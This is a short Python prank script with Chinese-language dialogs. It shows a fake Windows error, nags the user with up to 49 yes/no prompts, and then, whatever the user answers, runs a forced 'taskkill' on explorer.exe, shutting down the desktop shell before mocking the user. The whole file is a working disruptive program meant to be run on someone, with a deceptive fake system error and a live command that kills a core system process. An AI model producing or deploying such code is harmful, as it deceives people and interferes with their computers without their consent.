import tkinter.messagebox
import os
while True:
    tkinter.messagebox.showerror("Error","你的电脑出现了亿点点的问题，但Windows并不能修复它")
    for i in range(49):
        res1 = tkinter.messagebox.askquestion("提问","你想要电脑现在出问题吗")
        if res1 == "yes":
            os.system("taskkill /im explorer.exe /f")
            break
        else:
            tkinter.messagebox.showwarning("警告","你已点了" + str(i + 1) + "次，一共50次机会")
    else:
        os.system("taskkill /im explorer.exe /f")
        tkinter.messagebox.showinfo("哈哈哈","哈哈哈，早说让你点'是'你非不点，遭报应了吧")
        break
    break